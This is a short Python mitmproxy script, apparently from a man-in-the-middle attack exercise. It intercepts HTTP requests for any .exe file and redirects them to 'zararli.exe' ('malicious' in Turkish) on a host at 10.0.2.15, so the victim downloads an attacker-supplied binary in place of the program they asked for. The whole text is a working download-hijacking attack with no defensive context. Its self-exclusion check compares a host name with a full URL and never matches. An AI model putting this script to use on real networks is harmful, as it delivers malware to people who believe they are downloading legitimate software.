
import mitmproxy
import os
exeyol="http://10.0.2.15/zararli.exe"

def request(flow):
    if flow.request.host != exeyol and flow.request.pretty_url.endswith("exe"):
        flow.response = mitmproxy.http.Response.make(301, "", {"Location": exeyol})
